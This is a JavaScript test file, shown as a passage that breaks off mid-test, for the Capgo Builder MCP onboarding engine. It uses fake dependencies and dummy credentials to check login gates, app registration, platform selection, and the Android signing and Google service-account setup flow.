#!/usr/bin/env node
/** Headless tests for the MCP-conducted Capgo Builder onboarding engine. */
import process from 'node:process'

console.log('🧪 Testing MCP Builder onboarding...\n')

const { renderResult, ONBOARDING_RULES } = await import('../src/build/onboarding/mcp/contract.ts')
const { clearAllSessions } = await import('../src/build/onboarding/mcp/session-state.ts')

let pass = 0
let fail = 0
async function test(name, fn) {
  clearAllSessions() // isolate the process-local session platform between cases
  try { console.log(`\n🔍 ${name}`); await fn(); console.log(`✅ PASSED: ${name}`); pass++ }
  catch (e) { console.error(`❌ FAILED: ${name}`); console.error(`   ${e.message}`); fail++ }
}
function eq(a, b, msg) { if (a !== b) throw new Error(msg || `Expected ${JSON.stringify(b)}, got ${JSON.stringify(a)}`) }
function ok(c, msg) { if (!c) throw new Error(msg || 'expected truthy') }

await test('ONBOARDING_RULES is a non-trivial preamble', async () => {
  ok(Array.isArray(ONBOARDING_RULES) && ONBOARDING_RULES.length >= 3)
})

await test('renderResult leads with a directive and embeds the JSON', async () => {
  const result = {
    onboarding: 'capgo-builder', phase: 'preflight', state: 'platform-select', progress: 5,
    kind: 'choice', summary: 'Pick a platform.',
    options: [{ value: 'ios', label: 'iOS', note: 'needs Apple key' }],
    next: { tool: 'capgo_builder_onboarding_next_step', instruction: 'Ask the user, then call next_step.', call: 'capgo_builder_onboarding_next_step({ platform: "ios" })' },
  }
  const text = renderResult(result)
  ok(text.includes('DO THIS NEXT'), 'should contain the directive header')
  ok(text.includes('Example call:'), 'should contain the example call')
  ok(text.includes('"kind": "choice"'), 'should embed the JSON payload')
  ok(text.includes('- ios'), 'should list options')
})

const { decideStart, decideAdvance } = await import('../src/build/onboarding/mcp/engine.ts')

const facts = (o = {}) => ({
  capacitorProject: true,
  appId: 'com.acme.app',
  platformsDetected: ['ios', 'android'],
  authenticated: true,
  appRegistered: true,
  ...o,
})

// Build a minimal fake deps with no android-specific fields (for non-android tests)
function minimalFakeDeps(o = {}) {
  return {
    cwd: '/tmp/app',
    hasSavedKey: () => true,
    getAppId: async () => 'com.acme.app',
    detectPlatforms: async () => ['ios', 'android'],
    isAppRegistered: async () => true,
    loadProgress: async () => null,
    loadAndroidProgress: async () => null,
    androidEffectDeps: {
      generateKeystore: () => { throw new Error('not implemented') },
      listKeystoreAliases: () => { throw new Error('not implemented') },
      tryUnlockPrivateKey: () => { throw new Error('not implemented') },
      validateServiceAccountJson: async () => { throw new Error('not implemented') },
      updateSavedCredentials: async () => {},
      loadSavedCredentials: async () => null,
      saveAndroidProgress: async () => {},
      loadAndroidProgress: async () => null,
      deleteAndroidProgress: async () => {},
      readFile: async () => { throw new Error('not implemented') },
      copyFile: async () => {},
      runOAuthFlow: async () => { throw new Error('not implemented') },
      fetchUserInfo: async () => ({ email: 'u@x.com', sub: 'sub123' }),
      getAccessToken: async () => 'tok',
      revokeToken: async () => {},
      listProjects: async () => [],
      createProject: async () => { throw new Error('not implemented') },
      enableService: async () => {},
      ensureServiceAccount: async () => { throw new Error('not implemented') },
      createServiceAccountKey: async () => { throw new Error('not implemented') },
      inviteServiceAccount: async () => {},
      findAndroidApplicationIds: async () => [],
      startOAuthFlow: async () => ({ authUrl: 'https://auth', redirectUri: 'http://127.0.0.1/callback', result: new Promise(() => {}), close() {} }),
    },
    oauthSession: {
      begin: async () => ({ signInUrl: 'https://api.capgo.app/builder_auth_direct/google/start?s=X' }),
      poll: () => ({ status: 'absent' }),
      clear: () => {},
    },
    ...o,
  }
}

await test('decideStart: not a Capacitor project → error', async () => {
  const r = await decideStart(facts({ capacitorProject: false, appId: undefined }), null, minimalFakeDeps())
  eq(r.kind, 'error')
  eq(r.phase, 'preflight')
})

await test('decideStart: not authenticated → login human_gate via capgo_login', async () => {
  const r = await decideStart(facts({ authenticated: false }), null, minimalFakeDeps())
  eq(r.kind, 'human_gate')
  eq(r.state, 'login-required')
  ok(/capgo_login/i.test(r.human.instruction), 'should direct the agent to the capgo_login tool')
  ok(/connect/i.test(r.human.instruction), 'should point the user at the /connect key page')
  eq(r.next.tool, 'capgo_login', 'next action should call capgo_login')
})

await test('decideStart: both platforms → choice with ios/android options (no Appflow card)', async () => {
  const r = await decideStart(facts(), null, minimalFakeDeps())
  eq(r.kind, 'choice')
  eq(r.state, 'platform-select')
  eq(r.options.length, 2)
  ok(r.options.some(o => o.value === 'ios'), 'offers iOS')
  ok(r.options.some(o => o.value === 'android'), 'offers Android')
  ok(!r.options.some(o => o.value === 'appflow'), 'must NOT offer the Appflow picker option (gate-only now)')
  ok(r.roadmap.length >= 3, 'first decision should carry the roadmap')
})

await test('decideStart: single platform → auto-selects and enters credentials phase', async () => {
  const r = await decideStart(facts({ platformsDetected: ['android'] }), null, minimalFakeDeps())
  eq(r.platform, 'android')
  eq(r.phase, 'credentials')
})

await test('decideStart: no native folder → human_gate cap add', async () => {
  const r = await decideStart(facts({ platformsDetected: [] }), null, minimalFakeDeps())
  eq(r.kind, 'human_gate')
  eq(r.state, 'no-platform')
})

await test('decideAdvance: platform choice records it and enters credentials', async () => {
  const r = await decideAdvance(facts(), null, { platform: 'ios' }, minimalFakeDeps())
  eq(r.platform, 'ios')
  eq(r.phase, 'credentials')
})

await test('decideAdvance: platform choice while unauthenticated bounces to login', async () => {
  const r = await decideAdvance(facts({ authenticated: false }), null, { platform: 'ios' }, minimalFakeDeps())
  eq(r.state, 'login-required')
})

const { gatherFacts, runStart, runAdvance } = await import('../src/build/onboarding/mcp/engine.ts')

const fakeDeps = (o = {}) => ({
  cwd: '/tmp/app',
  hasSavedKey: () => true,
  getAppId: async () => 'com.acme.app',
  detectPlatforms: async () => ['ios'],
  isAppRegistered: async () => true,
  loadProgress: async () => null,
  loadAndroidProgress: async () => null,
  androidEffectDeps: minimalFakeDeps().androidEffectDeps,
  oauthSession: minimalFakeDeps().oauthSession,
  ...o,
})

await test('gatherFacts: maps injected deps into facts', async () => {
  const f = await gatherFacts(fakeDeps())
  eq(f.capacitorProject, true)
  eq(f.appId, 'com.acme.app')
  eq(f.authenticated, true)
  eq(f.platformsDetected.length, 1)
  eq(f.appRegistered, true)
})

await test('gatherFacts: no appId → not a capacitor project, skips app check', async () => {
  let appChecked = false
  const f = await gatherFacts(fakeDeps({
    getAppId: async () => undefined,
    isAppRegistered: async () => { appChecked = true; return true },
  }))
  eq(f.capacitorProject, false)
  eq(appChecked, false, 'must not call isAppRegistered without an appId')
})

await test('gatherFacts: unauthenticated skips the registered-app check', async () => {
  let appChecked = false
  const f = await gatherFacts(fakeDeps({
    hasSavedKey: () => false,
    isAppRegistered: async () => { appChecked = true; return true },
  }))
  eq(f.authenticated, false)
  eq(appChecked, false, 'must not call the API when unauthenticated')
})

await test('runStart: single platform via deps → enters credentials phase', async () => {
  const r = await runStart(fakeDeps())
  eq(r.platform, 'ios')
  eq(r.phase, 'credentials')
})

await test('runAdvance: passes platform input through to the decider', async () => {
  const r = await runAdvance(fakeDeps({ detectPlatforms: async () => ['ios', 'android'] }), { platform: 'ios' })
  eq(r.platform, 'ios')
})

await test('ONBOARDING_RULES advertises the explain tool', async () => {
  const { ONBOARDING_RULES } = await import('../src/build/onboarding/mcp/contract.ts')
  const joined = ONBOARDING_RULES.join('\n')
  ok(/capgo_builder_onboarding_explain/.test(joined), 'rules must mention the explain tool by name')
  ok(/confus|don.t understand|what .* means|plain.language|explain/i.test(joined), 'rules must tell the AI when to call it')
})

const { registerOnboardingTools } = await import('../src/build/onboarding/mcp/onboarding-tools.ts')

function fakeServer() {
  const tools = {}
  return {
    tools,
    registerTool(name, _config, handler) { tools[name] = { handler } },
    registerPrompt() {},
  }
}

await test('registerOnboardingTools: registers the two-tool spine', async () => {
  const server = fakeServer()
  registerOnboardingTools(server, /* sdk */ null, fakeDeps())
  ok(server.tools.start_capgo_builder_onboarding, 'start tool registered')
  ok(server.tools.capgo_builder_onboarding_next_step, 'next_step tool registered')
})

await test('registerOnboardingTools: start handler returns rendered text content', async () => {
  const server = fakeServer()
  registerOnboardingTools(server, null, fakeDeps())
  const res = await server.tools.start_capgo_builder_onboarding.handler({})
  ok(Array.isArray(res.content) && res.content[0].type === 'text', 'returns MCP text content')
  ok(res.content[0].text.includes('Capgo Builder onboarding'), 'renders the result')
})

await test('registerOnboardingTools: next_step handler forwards platform input', async () => {
  const server = fakeServer()
  registerOnboardingTools(server, null, fakeDeps({ detectPlatforms: async () => ['ios', 'android'] }))
  const res = await server.tools.capgo_builder_onboarding_next_step.handler({ platform: 'ios' })
  ok(res.content[0].text.includes('"platform": "ios"'), 'forwards the chosen platform')
})

await test('decideStart: authenticated but app not registered → auto registering-app', async () => {
  const r = await decideStart(facts({ appRegistered: false }), null, minimalFakeDeps())
  eq(r.kind, 'auto')
  eq(r.phase, 'app')
  eq(r.state, 'registering-app')
})

await test('decideStart: app registered → proceeds to platform decision', async () => {
  const r = await decideStart(facts({ appRegistered: true }), null, minimalFakeDeps())
  ok(r.state === 'platform-select' || r.phase === 'credentials', 'should be past the app phase')
})

await test('decideAdvance: platform chosen but app not registered → routes back to register first', async () => {
  const r = await decideAdvance(facts({ appRegistered: false }), null, { platform: 'ios' }, minimalFakeDeps())
  eq(r.state, 'registering-app')
})

function appPhaseDeps(o = {}) {
  let registered = false
  return {
    cwd: '/tmp/app',
    hasSavedKey: () => true,
    getAppId: async () => 'com.acme.app',
    detectPlatforms: async () => ['ios', 'android'],
    isAppRegistered: async () => registered,
    loadProgress: async () => null,
    loadAndroidProgress: async () => null,
    registerApp: async () => { registered = true; return { ok: true } },
    androidEffectDeps: minimalFakeDeps().androidEffectDeps,
    oauthSession: minimalFakeDeps().oauthSession,
    ...o,
  }
}

await test('runStart: unregistered app → executor registers it → ends at platform-select', async () => {
  const r = await runStart(appPhaseDeps())
  eq(r.state, 'platform-select')
})

await test('runStart: register-app side effect runs exactly once', async () => {
  let calls = 0
  let registered = false
  const deps = appPhaseDeps()
  deps.isAppRegistered = async () => registered
  deps.registerApp = async () => { calls++; registered = true; return { ok: true } }
  await runStart(deps)
  eq(calls, 1)
})

await test('drive loop guards against a non-progressing auto step', async () => {
  const deps = appPhaseDeps({ isAppRegistered: async () => false, registerApp: async () => ({ ok: true }) })
  const r = await runStart(deps)
  eq(r.kind, 'error')
  eq(r.state, 'auto-loop-guard')
})

await test('drive loop: app id taken by another account → human_gate conflict with suggestions', async () => {
  const deps = appPhaseDeps({
    isAppRegistered: async () => false,
    registerApp: async () => ({ ok: false, alreadyExists: true, error: 'already exists' }),
  })
  const r = await runStart(deps)
  eq(r.kind, 'human_gate')
  eq(r.state, 'app-id-conflict')
  ok(/com\.acme\.app/.test(r.human.instruction), 'should suggest alternates based on the id')
})

await test('drive loop: registration hard-fails → error result', async () => {
  const deps = appPhaseDeps({
    isAppRegistered: async () => false,
    registerApp: async () => ({ ok: false, alreadyExists: false, error: 'network down' }),
  })
  const r = await runStart(deps)
  eq(r.kind, 'error')
  eq(r.state, 'register-app-failed')
})

// ─── Plan B: Android credentials (new OAuth-default bridge) ──────────────────
const { decideAndroid } = await import('../src/build/onboarding/mcp/engine.ts')

// ── androidBridgeDeps: build a full fake EngineDeps that drives the real core ──
//
// The fake uses in-memory progress state and canned responses so tests are
// isolated from the real file system, GCP APIs, and browser OAuth.

// Fake broker-backed session mirroring broker-session.ts (begin/poll/clear). begin() flips to pending and
// returns the sign-in URL; helpers flip to awaiting_code / done / error.
function makeOAuthSessionFake() {
  let _entry = null
  const signInUrl = 'https://api.capgo.app/builder_auth_direct/google/start?s=PUB'
  return {
    begin: async (_appId) => { _entry = { status: 'pending', signInUrl }; return { signInUrl } },
    poll: (_appId, _confirmCode) => {
      if (!_entry) return { status: 'absent' }
      return { status: _entry.status, signInUrl: _entry.signInUrl, accessToken: _entry.accessToken, expiresAt: _entry.expiresAt, error: _entry.error }
    },
    clear: (_appId) => { _entry = null },
    // test helpers: flip the fake session to a later broker status
    _setDone(tokens) { if (_entry) { _entry.status = 'done'; _entry.accessToken = tokens.accessToken; _entry.expiresAt = tokens.expiresAt } },
    _setAwaitingCode() { if (_entry) { _entry.status = 'awaiting_code' } },
    _setError(err) { if (_entry) { _entry.status = 'error'; _entry.error = err instanceof Error ? err.message : String(err) } },
  }
}

function androidBridgeDeps(overrides = {}) {
  // In-memory android progress store
  let _androidProgress = null
  const callOrder = []

  const oauthSession = makeOAuthSessionFake()

  // controllable fake PendingOAuthSession
  let _oauthResolve = null
  const fakeOAuthSession = {
    authUrl: 'https://accounts.google.com/o/oauth2/v2/auth?fake=1',
    redirectUri: 'http://127.0.0.1:12345/callback',
    result: new Promise((res) => { _oauthResolve = res }),
    close() {},
  }

  // D2: default terminal launch deps — non-macOS by default so existing tests pass
  const defaultCanLaunchTerminal = () => false
  const defaultLaunchBuildInTerminal = async () => ({ ok: false, error: 'not implemented' })

  const effectDeps = {
    // Keystore — not used in these tests but must be present
    generateKeystore: () => ({
      p12Base64: 'base64ks==',
      alias: 'release',
      notAfter: new Date(2030, 1, 1),
    }),
    listKeystoreAliases: () => ({ ok: true, aliases: ['release'] }),
    tryUnlockPrivateKey: () => ({ ok: true }),

    // SA validation — always passes
    validateServiceAccountJson: async () => ({
      ok: true,
      serviceAccountEmail: 'sa@proj-1.iam.gserviceaccount.com',
      projectId: 'proj-1',
    }),

    // Credentials persistence
    updateSavedCredentials: async (appId, platform, creds) => {
      callOrder.push('updateSavedCredentials')
      effectDeps._savedCreds = creds
    },
    loadSavedCredentials: async () => null,

    // Progress persistence (in-memory)
    saveAndroidProgress: async (appId, prog) => { _androidProgress = prog },
    loadAndroidProgress: async (appId) => _androidProgress,
    deleteAndroidProgress: async () => { _androidProgress = null },

    // File system (fake — returns placeholder bytes)
    readFile: async () => Buffer.from('{"type":"service_account","project_id":"proj-1"}'),
    copyFile: async () => {},

    // OAuth — unused in fire-and-poll path (bridge uses startAndroidOAuth instead)
    runOAuthFlow: async () => { throw new Error('runOAuthFlow must not be called in MCP bridge') },
    fetchUserInfo: async (accessToken) => ({ email: 'user@example.com', sub: 'google-sub-123' }),
    getAccessToken: async () => {
      callOrder.push('getAccessToken')
      return 'access-token-fake'
    },
    revokeToken: async () => { callOrder.push('revokeToken') },

    // GCP
    listProjects: async () => {
      callOrder.push('listProjects')
      return [{ projectId: 'proj-1', name: 'Proj 1', projectNumber: '111' }]
    },
    createProject: async () => { throw new Error('createProject not expected') },
    enableService: async () => { callOrder.push('enableService') },
    ensureServiceAccount: async () => {
      callOrder.push('ensureServiceAccount')
      return { account: { email: 'sa@proj-1.iam.gserviceaccount.com', uniqueId: 'uid-1' }, created: true }
    },
    createServiceAccountKey: async () => {
      callOrder.push('createServiceAccountKey')
      return { privateKeyDataBase64: 'sa-key-base64==' }
    },

    // Play API
    inviteServiceAccount: async () => { callOrder.push('inviteServiceAccount') },

    // Android package detection
    findAndroidApplicationIds: async () => {
      callOrder.push('findAndroidApplicationIds')
      return ['com.acme.app']
    },

    // Non-blocking OAuth (fire-and-poll)
    startOAuthFlow: async () => fakeOAuthSession,

    // Callbacks
    onStatus: undefined,
    onLog: undefined,
  }

  const deps = {
    cwd: '/tmp/app',
    hasSavedKey: () => true,
    getAppId: async () => 'com.acme.app',
    detectPlatforms: async () => ['android'],
    isAppRegistered: async () => true,
    loadProgress: async () => null,
    loadAndroidProgress: async () => _androidProgress,
    registerApp: async () => ({ ok: true }),
    setAndroidServiceAccountPath: async () => {},
    readBuildRecord: async () => null,
    buildRecordPath: (appId, platform) => `/tmp/capgo-build-record-${appId}-${platform}.json`,
    setIosApiKey: async () => {},
    finalizeIosCredentials: async () => ({ ok: true }),
    androidEffectDeps: effectDeps,
    oauthSession: oauthSession,
    // D2: terminal launch deps (default: non-macOS, so existing tests pass unchanged)
    canLaunchTerminal: defaultCanLaunchTerminal,
    launchBuildInTerminal: defaultLaunchBuildInTerminal,
    // expose internal helpers for tests
    _callOrder: callOrder,
    _savedCreds: () => effectDeps._savedCreds,
    _oauthFakeSession: fakeOAuthSession,
    _oauthResolve: () => _oauthResolve,
    _oauthSession: oauthSession,
    _setAndroidProgress: (p) => { _androidProgress = p },
    _getAndroidProgress: () => _androidProgress,
    ...overrides,
  }

  return deps
}

// Test 1: keystore-ready → service-account-method-select choice
await test('android bridge: keystore-ready progress → service-account-method-select choice', async () => {
  const deps = androidBridgeDeps()
  const keystoreProgress = {
    platform: 'android',
    appId: 'com.acme.app',
    startedAt: new Date().toISOString(),
    serviceAccountForkSeen: true,
    keystoreMethod: 'generate',
    keystoreAlias: 'release',
    keystoreStorePassword: 'storePw',
    keystoreKeyPassword: 'keyPw',
    _keystoreBase64: 'base64ks==',
    completedSteps: {
      keystoreReady: { keystorePath: 'android/app/release.p12', alias: 'release', isGenerated: true },
    },
  }
  deps._setAndroidProgress(keystoreProgress)
  const facts = {
    capacitorProject: true,
    appId: 'com.acme.app',
    platformsDetected: ['android'],
    authenticated: true,
    appRegistered: true,
    androidProgress: keystoreProgress,
    iosProgress: null,
  }
  const r = await decideAndroid(facts, deps)
  eq(r.kind, 'choice', `expected choice, got ${r.kind}`)
  eq(r.state, 'service-account-method-select')
  eq(r.platform, 'android')
  ok(r.options && r.options.length >= 2, 'must have at least 2 options (generate + existing)')
  ok(r.options.some(o => o.value === 'generate'), 'must have generate option')
  ok(r.options.some(o => o.value === 'existing'), 'must have existing option')
  ok(r.next && r.next.with && 'serviceAccountMethod' in r.next.with, 'next must carry serviceAccountMethod field')
})

// Test 2: serviceAccountMethod:'generate' → google-sign-in human_gate (the safety gate)
await test('android bridge: serviceAccountMethod:generate → google-sign-in human_gate (safety gate)', async () => {
  const deps = androidBridgeDeps()
  const keystoreProgress = {
    platform: 'android',
    appId: 'com.acme.app',
    startedAt: new Date().toISOString(),
    serviceAccountForkSeen: true,
    serviceAccountMethod: 'generate',
    keystoreMethod: 'generate',
    keystoreAlias: 'release',
    keystoreStorePassword: 'storePw',
    keystoreKeyPassword: 'keyPw',
    _keystoreBase64: 'base64ks==',
    completedSteps: {
      keystoreReady: { keystorePath: 'android/app/release.p12', alias: 'release', isGenerated: true },
    },
  }
  deps._setAndroidProgress(keystoreProgress)
  const facts = {
    capacitorProject: true,
    appId: 'com.acme.app',
    platformsDetected: ['android'],
    authenticated: true,
    appRegistered: true,
    androidProgress: keystoreProgress,
    iosProgress: null,
  }
  const r = await decideAndroid(facts, deps)
  eq(r.kind, 'human_gate', `expected human_gate (safety gate), got ${r.kind}`)
  eq(r.state, 'google-sign-in')
  ok(r.human && r.human.instruction, 'must have human instruction')
  ok(/browser|google|sign.?in/i.test(r.human.instruction), 'instruction must mention sign-in')
  ok(r.next && r.next.tool === 'capgo_builder_onboarding_next_step', 'next tool must be next_step')
})

// Test 3: proceed next_step({}) at gate (oauthSession absent) → begin called → "browser opened" human_gate
await test('android bridge: proceed at google-sign-in gate (absent) → begins OAuth → browser-opened human_gate', async () => {
  const deps = androidBridgeDeps()
  const keystoreProgress = {
    platform: 'android',
    appId: 'com.acme.app',
    startedAt: new Date().toISOString(),
    serviceAccountForkSeen: true,
    serviceAccountMethod: 'generate',
    keystoreMethod: 'generate',
    keystoreAlias: 'release',
    keystoreStorePassword: 'storePw',
    keystoreKeyPassword: 'keyPw',
    _keystoreBase64: 'base64ks==',
    completedSteps: {
      keystoreReady: { keystorePath: 'android/app/release.p12', alias: 'release', isGenerated: true },
    },
  }
  deps._setAndroidProgress(keystoreProgress)
  const facts = {
    capacitorProject: true,
    appId: 'com.acme.app',
    platformsDetected: ['android'],
    authenticated: true,
    appRegistered: true,
    androidProgress: keystoreProgress,
    iosProgress: null,
  }
  // pass signInProceed:true (as drive() would when detecting a continue with no input)
  const r = await decideAndroid(facts, deps, { signInProceed: true })
  eq(r.kind, 'human_gate', `expected human_gate (browser opened), got ${r.kind}`)
  ok(r.state === 'google-sign-in', `expected state google-sign-in, got ${r.state}`)
  ok(/browser|opened|sign.?in/i.test(r.summary) || /browser|opened|sign.?in/i.test(r.human.instruction), 'should mention browser opened')
  // oauthSession begin must have been called (fake transitions from absent → pending)
  eq(deps._oauthSession.poll('com.acme.app').status, 'pending', 'oauthSession must be pending after begin')
})

// Test 4: continue next_step({}) while pending → "still waiting" human_gate
await test('android bridge: proceed while oauthSession pending → still-waiting human_gate', async () => {
  const deps = androidBridgeDeps()
  const keystoreProgress = {
    platform: 'android',
    appId: 'com.acme.app',
    startedAt: new Date().toISOString(),
    serviceAccountForkSeen: true,
    serviceAccountMethod: 'generate',
    keystoreMethod: 'generate',
    keystoreAlias: 'release',
    keystoreStorePassword: 'storePw',
    keystoreKeyPassword: 'keyPw',
    _keystoreBase64: 'base64ks==',
    completedSteps: {
      keystoreReady: { keystorePath: 'android/app/release.p12', alias: 'release', isGenerated: true },
    },
  }
  deps._setAndroidProgress(keystoreProgress)
  const facts = {
    capacitorProject: true,
    appId: 'com.acme.app',
    platformsDetected: ['android'],
    authenticated: true,
    appRegistered: true,
    androidProgress: keystoreProgress,
    iosProgress: null,
  }
  // First proceed: begins OAuth, status → pending
  await decideAndroid(facts, deps, { signInProceed: true })
  eq(deps._oauthSession.poll('com.acme.app').status, 'pending')
  // Second proceed while still pending
  const r = await decideAndroid(facts, deps, { signInProceed: true })
  eq(r.kind, 'human_gate', `expected human_gate (still waiting), got ${r.kind}`)
  ok(/waiting|pending|sign.?in|browser/i.test(r.summary) || /waiting|pending|sign.?in|browser/i.test(r.human.instruction), 'should mention still waiting')
})

// Test 5: continue next_step({}) after flipping fake to done → persists sign-in → play-developer-id-input
await test('android bridge: proceed after OAuth done → persists sign-in → play-developer-id-input', async () => {
  const deps = androidBridgeDeps()
  const keystoreProgress = {
    platform: 'android',
    appId: 'com.acme.app',
    startedAt: new Date().toISOString(),
    serviceAccountForkSeen: true,
    serviceAccountMethod: 'generate',
    keystoreMethod: 'generate',
    keystoreAlias: 'release',
    keystoreStorePassword: 'storePw',
    keystoreKeyPassword: 'keyPw',
    _keystoreBase64: 'base64ks==',
    completedSteps: {
      keystoreReady: { keystorePath: 'android/app/release.p12', alias: 'release', isGenerated: true },
    },
  }
  deps._setAndroidProgress(keystoreProgress)
  const facts = {
    capacitorProject: true,
    appId: 'com.acme.app',
    platformsDetected: ['android'],
    authenticated: true,
    appRegistered: true,
    androidProgress: keystoreProgress,
    iosProgress: null,
  }
  // Begin OAuth
  await decideAndroid(facts, deps, { signInProceed: true })
  // Flip to done with tokens
  deps._oauthSession._setDone({
    accessToken: 'at123',
    refreshToken: 'rt123',
    expiresAt: Date.now() + 3600_000,
    scope: 'openid https://www.googleapis.com/auth/androidpublisher',
    tokenType: 'Bearer',
  })
  // The facts must reflect updated progress (re-gather)
  const updatedFacts = {
    ...facts,
    androidProgress: deps._getAndroidProgress(),
  }
  const r = await decideAndroid(updatedFacts, deps, { signInProceed: true })
  // Should advance to play-developer-id-input (sign-in complete, next step)
  eq(r.state, 'play-developer-id-input', `expected play-developer-id-input, got ${r.state}`)
  eq(r.kind, 'human_gate')
  // Progress must have been persisted with googleSignInComplete
  const saved = deps._getAndroidProgress()
  ok(saved && saved.completedSteps && saved.completedSteps.googleSignInComplete, 'googleSignInComplete must be persisted')
  eq(saved.completedSteps.googleSignInComplete.email, 'user@example.com')
  // oauthSession must be cleared
  eq(deps._oauthSession.poll('com.acme.app').status, 'absent', 'session must be cleared after done')
})

// Test 6: playDeveloperId input → projects-loading effect → gcp-projects-select choice
await test('android bridge: playDeveloperId → gcp-projects-loading → gcp-projects-select choice', async () => {
  const deps = androidBridgeDeps()
  // Progress after sign-in complete
  const progress = {
    platform: 'android',
    appId: 'com.acme.app',
    startedAt: new Date().toISOString(),
    serviceAccountForkSeen: true,
    serviceAccountMethod: 'generate',
    keystoreMethod: 'generate',
    keystoreAlias: 'release',
    keystoreStorePassword: 'storePw',
    keystoreKeyPassword: 'keyPw',
    _keystoreBase64: 'base64ks==',
    _oauthRefreshToken: 'rt123',
    completedSteps: {
      keystoreReady: { keystorePath: 'android/app/release.p12', alias: 'release', isGenerated: true },
      googleSignInComplete: { email: 'user@example.com', googleSubject: 'sub123', scope: 'openid' },
      playAccountChosen: { developerId: '1234567890123456789' },
    },
  }
  deps._setAndroidProgress(progress)
  const facts = {
    capacitorProject: true,
    appId: 'com.acme.app',
    platformsDetected: ['android'],
    authenticated: true,
    appRegistered: true,
    androidProgress: progress,
    iosProgress: null,
  }
  const r = await decideAndroid(facts, deps)
  eq(r.state, 'gcp-projects-select', `expected gcp-projects-select, got ${r.state}`)
  eq(r.kind, 'choice')
  ok(r.options && r.options.some(o => o.value === 'proj-1'), 'must list proj-1')
  ok(r.options.some(o => o.value === '__new__'), 'must have __new__ option')
  ok(r.next && r.next.with && 'gcpProjectId' in r.next.with, 'next must carry gcpProjectId field')
})

// Test 7: gcpProjectId → package preload → android-package-select choice
await test('android bridge: gcpProjectId → android-package-select choice with detected package', async () => {
  const deps = androidBridgeDeps()
  const progress = {
    platform: 'android',
    appId: 'com.acme.app',
    startedAt: new Date().toISOString(),
    serviceAccountForkSeen: true,
    serviceAccountMethod: 'generate',
    keystoreMethod: 'generate',
    keystoreAlias: 'release',
    keystoreStorePassword: 'storePw',
    keystoreKeyPassword: 'keyPw',
    _keystoreBase64: 'base64ks==',
    _oauthRefreshToken: 'rt123',
    completedSteps: {
      keystoreReady: { keystorePath: 'android/app/release.p12', alias: 'release', isGenerated: true },
      googleSignInComplete: { email: 'user@example.com', googleSubject: 'sub123', scope: 'openid' },
      playAccountChosen: { developerId: '1234567890123456789' },
      gcpProjectChosen: { projectId: 'proj-1', displayName: 'Proj 1', createdByOnboarding: false },
    },
  }
  deps._setAndroidProgress(progress)
  const facts = {
    capacitorProject: true,
    appId: 'com.acme.app',
    platformsDetected: ['android'],
    authenticated: true,
    appRegistered: true,
    androidProgress: progress,
    iosProgress: null,
  }
  const r = await decideAndroid(facts, deps)
  eq(r.state, 'android-package-select', `expected android-package-select, got ${r.state}`)
  eq(r.kind, 'choice', 'android-package-select must be choice when packages detected')
  ok(r.options && r.options.some(o => o.value === 'com.acme.app'), 'must list the detected package')
  ok(r.next && r.next.with && 'androidPackage' in r.next.with, 'next must carry androidPackage field')
})

// Test 8: androidPackage → full GCP setup chain → build-ready + assert updateSavedCredentials shape
await test('android bridge: androidPackage → gcp-setup-running chain → build-ready + 5-key credentials', async () => {
  const deps = androidBridgeDeps()
  const callOrder = deps._callOrder
  const progress = {
    platform: 'android',
    appId: 'com.acme.app',
    startedAt: new Date().toISOString(),
    serviceAccountForkSeen: true,
    serviceAccountMethod: 'generate',
    keystoreMethod: 'generate',
    keystoreAlias: 'release',
    keystoreStorePassword: 'storePw',
    keystoreKeyPassword: 'keyPw',
    _keystoreBase64: 'base64ks==',
    _oauthRefreshToken: 'rt123',
    completedSteps: {
      keystoreReady: { keystorePath: 'android/app/release.p12', alias: 'release', isGenerated: true },
      googleSignInComplete: { email: 'user@example.com', googleSubject: 'sub123', scope: 'openid' },
      playAccountChosen: { developerId: '1234567890123456789' },
      gcpProjectChosen: { projectId: 'proj-1', displayName: 'Proj 1', createdByOnboarding: false },
      androidPackageChosen: { packageName: 'com.acme.app', source: 'gradle' },
    },
  }
  deps._setAndroidProgress(progress)
  const facts = {
    capacitorProject: true,
    appId: 'com.acme.app',
    platformsDetected: ['android'],
    authenticated: true,
    appRegistered: true,
    androidProgress: progress,
    iosProgress: null,
  }
  const r = await decideAndroid(facts, deps)
  eq(r.state, 'build-ready', `expected build-ready, got ${r.state}`)
  eq(r.kind, 'choice')
  eq(r.platform, 'android')

  // Assert call order: enableService → ensureServiceAccount → createServiceAccountKey → inviteServiceAccount → revokeToken
  const setupIdx = {
    enableService: callOrder.indexOf('enableService'),
    ensureServiceAccount: callOrder.indexOf('ensureServiceAccount'),
    createServiceAccountKey: callOrder.indexOf('createServiceAccountKey'),
    inviteServiceAccount: callOrder.indexOf('inviteServiceAccount'),
    revokeToken: callOrder.indexOf('revokeToken'),
  }
  ok(setupIdx.enableService >= 0, 'enableService must be called')
  ok(setupIdx.ensureServiceAccount > setupIdx.enableService, 'ensureServiceAccount must come after enableService')
  ok(setupIdx.createServiceAccountKey > setupIdx.ensureServiceAccount, 'createServiceAccountKey must come after ensureServiceAccount')
  ok(setupIdx.inviteServiceAccount > setupIdx.createServiceAccountKey, 'inviteServiceAccount must come after createServiceAccountKey')
  ok(setupIdx.revokeToken > setupIdx.inviteServiceAccount, 'revokeToken must come after inviteServiceAccount')

  // Assert updateSavedCredentials was called with a 5-key shape
  const creds = deps._savedCreds()
  ok(creds !== undefined, 'updateSavedCredentials must have been called')
  ok('ANDROID_KEYSTORE_FILE' in creds, 'must have ANDROID_KEYSTORE_FILE')
  ok('KEYSTORE_KEY_ALIAS' in creds, 'must have KEYSTORE_KEY_ALIAS')
  ok('KEYSTORE_STORE_PASSWORD' in creds, 'must have KEYSTORE_STORE_PASSWORD')
  ok('KEYSTORE_KEY_PASSWORD' in creds, 'must have KEYSTORE_KEY_PASSWORD')
  ok('PLAY_CONFIG_JSON' in creds, 'must have PLAY_CONFIG_JSON')
  eq(Object.keys(creds).length, 5, 'must have exactly 5 credential keys')
})

// Test 9: BYO path — serviceAccountMethod:'existing' → android-package-select (BYO path minimal check)
await test('android bridge: serviceAccountMethod:existing → android-package-select (BYO path)', async () => {
  const deps = androidBridgeDeps()
  const progress = {
    platform: 'android',
    appId: 'com.acme.app',
    startedAt: new Date().toISOString(),
    serviceAccountForkSeen: true,
    serviceAccountMethod: 'existing',
    keystoreMethod: 'generate',
    keystoreAlias: 'release',
    keystoreStorePassword: 'storePw',
    keystoreKeyPassword: 'keyPw',
    _keystoreBase64: 'base64ks==',
    completedSteps: {
      keystoreReady: { keystorePath: 'android/app/release.p12', alias: 'release', isGenerated: true },
    },
  }
  deps._setAndroidProgress(progress)
